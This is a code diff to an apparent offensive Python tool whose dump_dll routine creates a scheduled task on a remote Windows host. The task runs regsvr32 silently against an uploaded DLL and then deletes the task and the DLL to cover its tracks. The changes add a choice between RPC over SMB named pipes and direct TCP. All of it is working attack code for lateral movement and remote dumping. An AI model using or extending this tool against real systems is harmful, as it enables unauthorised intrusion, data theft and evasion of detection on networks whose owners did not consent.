@@ -48,9 +48,11 @@ def _scm(subcmd, auth, extra, verbose=False, timeout=30):
     return _run(SCM_BIN, subcmd, auth, extra, verbose, timeout)
 
 
-def _tsch(subcmd, auth, extra, verbose=False, timeout=60):
+def _tsch(subcmd, auth, extra, verbose=False, timeout=60, prefer_smb=True):
     import subprocess
     cmd = [TSCH_BIN, subcmd] + auth + extra
+    if prefer_smb:
+        cmd.append('-PreferSmb')
     if verbose:
         print(f'  >> {" ".join(cmd)}', file=sys.stderr)
     try:
@@ -183,11 +185,12 @@ def dump_dll(host, auth, args):
 
     try:
         print(f'[*] Creating scheduled task...', file=sys.stderr)
+        smb = not args.rpc_tcp
         out, rc = _tsch('create', auth + [host],
                         ['-TaskPath', task_name,
                          '-Command', 'regsvr32.exe',
                          '-Arguments', f'/s /n /i {remote_dll}'],
-                        args.verbose)
+                        args.verbose, prefer_smb=smb)
         if rc != 0:
             print(f'[!] Task create failed', file=sys.stderr)
             if out:
@@ -196,7 +199,8 @@ def dump_dll(host, auth, args):
 
         print(f'[*] Running task...', file=sys.stderr)
         out, rc = _tsch('run', auth + [host],
-                        ['-TaskPath', task_name], args.verbose)
+                        ['-TaskPath', task_name], args.verbose,
+                        prefer_smb=smb)
         if rc != 0:
             print(f'[!] Task run failed', file=sys.stderr)
             return False
@@ -219,7 +223,8 @@ def dump_dll(host, auth, args):
         print(f'[*] Cleaning up...', file=sys.stderr)
         time.sleep(2)
         out, rc = _tsch('delete', auth + [host],
-                        ['-TaskPath', task_name], args.verbose)
+                        ['-TaskPath', task_name], args.verbose,
+                        prefer_smb=smb)
         _msg('task deleted', rc == 0)
         out, rc = _smb('rm', auth, [unc_dll], args.verbose)
         _msg('DLL removed', rc == 0)
@@ -270,6 +275,8 @@ def parse_args():
     p.add_argument('-o', '--output', '--output-dir', metavar='DIR', default=None,
                    dest='output_dir')
     p.add_argument('--timeout', type=int, default=120)
+    p.add_argument('--rpc-tcp', action='store_true',
+                   help='Use direct TCP for RPC (default: named pipes over SMB)')
     p.add_argument('-v', '--verbose', action='store_true')
 
     args = p.parse_args()
